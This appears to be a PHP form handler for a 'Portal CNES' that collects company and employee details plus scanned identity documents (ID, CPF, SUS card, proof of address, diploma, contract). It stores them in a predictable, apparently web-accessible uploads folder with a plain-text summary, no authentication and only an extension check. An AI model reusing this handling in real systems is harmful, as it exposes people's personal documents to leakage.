<?php
// =================== CONFIGURAÇÕES BÁSICAS ===================
$uploadBase = __DIR__ . '/uploads';

// Garante que a pasta base existe
if (!is_dir($uploadBase)) {
    mkdir($uploadBase, 0775, true);
}

// Pega dados do formulário (com segurança básica)
function limpar($valor) {
    return trim(filter_var($valor ?? '', FILTER_SANITIZE_STRING));
}

$empresa       = limpar($_POST['empresa'] ?? '');
$municipio     = limpar($_POST['municipio'] ?? '');
$responsavel   = limpar($_POST['responsavel'] ?? '');
$email_contato = limpar($_POST['email_contato'] ?? '');
$telefone      = limpar($_POST['telefone'] ?? '');
$nome_servidor = limpar($_POST['nome_servidor'] ?? '');
$cargo_servidor= limpar($_POST['cargo_servidor'] ?? '');

// Cria uma pasta específica para esse envio
$slug = preg_replace('/[^a-z0-9_-]/i', '_', $empresa . '_' . $nome_servidor);
$slug = substr($slug, 0, 40); // limita tamanho
$dirEnvio = $uploadBase . '/' . date('Ymd_His') . '_' . $slug;

if (!is_dir($dirEnvio)) {
    mkdir($dirEnvio, 0775, true);
}

// =================== TRATAMENTO DOS ARQUIVOS ===================
$camposArquivos = [
    'doc_identidade' => '01_documento_foto',
    'doc_cpf'        => '02_cpf',
    'doc_cns'        => '03_cartao_sus',
    'doc_endereco'   => '04_comprovante_endereco',
    'doc_diploma'    => '05_diploma_conselho',
    'doc_contrato'   => '06_contrato_portaria',
];

$arquivosSalvos = [];

foreach ($camposArquivos as $campo => $prefixoNome) {
    if (isset($_FILES[$campo]) && $_FILES[$campo]['error'] === UPLOAD_ERR_OK) {

        $nomeOriginal = $_FILES[$campo]['name'];
        $tmpName      = $_FILES[$campo]['tmp_name'];

        // Pega apenas a extensão
        $ext = strtolower(pathinfo($nomeOriginal, PATHINFO_EXTENSION));

        // Garante extensão segura
        $extPermitidas = ['pdf', 'jpg', 'jpeg', 'png'];
        if (!in_array($ext, $extPermitidas)) {
            continue; // ignora se extensão for inválida
        }

        $nomeFinal = $prefixoNome . '.' . $ext;
        $destino   = $dirEnvio . '/' . $nomeFinal;

        if (move_uploaded_file($tmpName, $destino)) {
            $arquivosSalvos[] = $nomeFinal;
        }
    }
}

// =================== REGISTRA UMA "FICHINHA" DO ENVIO ===================
$info = [
    'data_envio'     => date('d/m/Y H:i'),
    'empresa'        => $empresa,
    'municipio'      => $municipio,
    'responsavel'    => $responsavel,
    'email_contato'  => $email_contato,
    'telefone'       => $telefone,
    'nome_servidor'  => $nome_servidor,
    'cargo_servidor' => $cargo_servidor,
    'arquivos'       => $arquivosSalvos,
];

file_put_contents($dirEnvio . '/dados_envio.txt', print_r($info, true));

// =================== (OPCIONAL) ENVIO DE E-MAIL RESUMO ===================
// Se quiser receber um e-mail, descomente e configure:

/*
$para    = 'gilima728@gmail.com'; // seu e-mail
$assunto = 'Novo envio de documentos - Portal CNES';
$mensagem  = "Novo envio recebido:\n\n";
$mensagem .= "Empresa: {$empresa}\n";
$mensagem .= "Município: {$municipio}\n";
$mensagem .= "Responsável: {$responsavel}\n";
$mensagem .= "E-mail: {$email_contato}\n";
$mensagem .= "Telefone: {$telefone}\n\n";
$mensagem .= "Servidor: {$nome_servidor}\n";
$mensagem .= "Cargo: {$cargo_servidor}\n\n";
$mensagem .= "Pasta dos arquivos: {$dirEnvio}\n";

@mail($para, $assunto, $mensagem);
*/

// =================== RESPOSTA SIMPLES PARA O USUÁRIO ===================
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Envio concluído – Portal CNES</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
<div class="page">
  <div class="card">
    <div class="card-header">
      <h1>Envio concluído ✅</h1>
      <p>Os documentos foram recebidos e armazenados com sucesso.</p>
    </div>

    <div class="section">
      <h2>Resumo do envio</h2>
      <p><strong>Unidade/Empresa:</strong> <?= htmlspecialchars($empresa) ?></p>
      <p><strong>Servidor:</strong> <?= htmlspecialchars($nome_servidor) ?></p>
      <p><strong>Cargo:</strong> <?= htmlspecialchars($cargo_servidor) ?></p>
      <p><strong>Pasta de armazenamento (no servidor):</strong><br>
        <code><?= htmlspecialchars($dirEnvio) ?></code>
      </p>

      <?php if (!empty($arquivosSalvos)): ?>
        <p><strong>Arquivos salvos:</strong></p>
        <ul>
          <?php foreach ($arquivosSalvos as $arq): ?>
            <li><?= htmlspecialchars($arq) ?></li>
          <?php endforeach; ?>
        </ul>
      <?php else: ?>
        <p><em>Nenhum arquivo foi salvo.</em></p>
      <?php endif; ?>
    </div>

    <a href="index.html" class="btn-primary" style="display:inline-block;text-align:center;text-decoration:none;margin-top:12px;">
      Enviar outro cadastro
    </a>
  </div>
</div>
</body>
</html>
